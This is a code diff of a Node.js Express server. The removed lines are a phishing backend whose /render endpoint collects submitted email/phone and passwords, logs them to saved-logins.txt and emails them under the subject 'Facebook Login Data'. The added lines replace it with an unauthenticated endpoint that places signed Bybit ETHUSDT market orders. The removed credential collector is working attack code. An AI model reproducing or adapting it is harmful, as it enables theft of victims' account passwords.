@@ -1,52 +1,63 @@
-const express = require("express");
-const bodyParser = require("body-parser");
-const fs = require("fs");
-const nodemailer = require("nodemailer");
-const cors = require("cors"); // 🆕 CORS support
-require("dotenv").config();
+const express = require('express');
+const cors = require('cors');
+const bodyParser = require('body-parser');
+const crypto = require('crypto');
+const axios = require('axios');
+require('dotenv').config();
 
 const app = express();
-const port = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3000;
 
-app.use(cors()); // ✅ Allow CORS
-app.use(bodyParser.urlencoded({ extended: false }));
+app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static(__dirname));
 
-const transporter = nodemailer.createTransport({
-  service: "gmail",
-  auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS,
-  },
-});
+function generateSignature(params, apiSecret) {
+  const orderedParams = Object.keys(params).sort().reduce((obj, key) => {
+    obj[key] = params[key];
+    return obj;
+  }, {});
 
-app.post("/render", (req, res) => {
-  const { email, password } = req.body;
-  const logEntry = `EMAIL/PHONE: ${email} | PASSWORD: ${password} | TIME: ${new Date().toISOString()}\n`;
+  const paramString = Object.entries(orderedParams).map(([key, value]) => `${key}=${value}`).join('&');
+  return crypto.createHmac('sha256', apiSecret).update(paramString).digest('hex');
+}
 
-  fs.appendFile("saved-logins.txt", logEntry, (err) => {
-    if (err) console.error("Error saving file:", err);
-  });
+app.post('/signal', async (req, res) => {
+  const { action } = req.body;
 
-  const mailOptions = {
-    from: process.env.EMAIL_USER,
-    to: process.env.SEND_TO,
-    subject: "🔐 Facebook Login Data (Personal Use)",
-    text: logEntry,
+  if (!['buy', 'sell'].includes(action)) {
+    return res.status(400).json({ message: 'Invalid action.' });
+  }
+
+  const timestamp = Date.now().toString();
+  const params = {
+    category: 'linear',
+    symbol: 'ETHUSDT',
+    side: action.toUpperCase(),
+    orderType: 'Market',
+    qty: 0.01,
+    timeInForce: 'GoodTillCancel',
+    apiKey: process.env.BYBIT_API_KEY,
+    timestamp
   };
 
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.error("Email error:", error);
-      return res.status(500).send("Email send error.");
-    } else {
-      console.log("✅ Email sent:", info.response);
-      res.send("Login received and emailed!");
-    }
-  });
+  const signature = generateSignature(params, process.env.BYBIT_API_SECRET);
+
+  try {
+    const result = await axios.post('https://api.bybit.com/v5/order/create', params, {
+      headers: {
+        'X-BYBIT-API-KEY': process.env.BYBIT_API_KEY,
+        'X-BYBIT-SIGNATURE': signature,
+        'Content-Type': 'application/json'
+      }
+    });
+
+    res.json({ message: `${action} order sent`, result: result.data });
+  } catch (err) {
+    console.error(err.response?.data || err.message);
+    res.status(500).json({ error: 'Order failed', details: err.response?.data });
+  }
 });
 
-app.listen(port, () => {
-  console.log(`🚀 Server running at http://localhost:${port}`);
+app.listen(PORT, () => {
+  console.log(`🟢 Backend running on http://localhost:${PORT}`);
 });
